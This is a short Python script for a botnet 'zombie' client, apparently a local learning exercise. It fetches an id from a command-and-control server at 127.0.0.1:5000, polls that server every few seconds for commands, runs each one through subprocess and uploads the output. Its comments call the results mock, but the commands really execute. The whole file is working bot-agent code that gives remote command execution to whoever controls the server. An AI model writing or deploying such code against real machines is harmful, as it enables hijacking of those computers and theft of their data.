from urllib.request import Request, urlopen
from time import sleep
import subprocess
import unicodedata


# the number of seconds to between sebsequent requests to the server to fetch a command
INTER_REQUEST_DELAY = 4


def get_zid_from_server():
    print('zombie - get_id_from_server')
    """get a new zid from the server"""
    with urlopen("http://127.0.0.1:5000/getId") as httpres:
        zid = bytes.decode(httpres.read())
        return zid

# try to read zombie id. if there is nothing to read, this must be a new zombie so request for an id
try:
    with open('zid', 'r') as file:
        zid = file.read()
except FileNotFoundError:
    zid = get_zid_from_server()
    with open('zid', 'w') as file:
        file.write(zid)


def remove_control_characters(s):
    return "".join(ch for ch in s if unicodedata.category(ch)[0]!="C")

command = ""
while True:
    print('zombie - main loop')
    with urlopen("http://127.0.0.1:5000/getCommand/{}".format(zid)) as res:
        res = bytes.decode(res.read())
        if res == "die":
            break
        if res not in (command, "die"): # the command has changed, and it's not 'die'. so execute.
            print(f"command is {command} but what's received is {res}")
            command = res
            print("assume", command, "is executed.")
            # let's send the result (a mock result) to the responder after 2 seconds.
            completed = subprocess.run(command.split(), stdout=subprocess.PIPE)
            with urlopen('http://127.0.0.1:5000/reportResult/{}/{}/"{}"'.format(zid, command, remove_control_characters(completed.stdout.decode('utf-8'))).replace(" ", "%20")) as http_response:
                print(f"status code from server upon uploading command result : {http_response.status}")
                print("server said", bytes.decode(http_response.read()))
    sleep(INTER_REQUEST_DELAY)

print("dying ... ")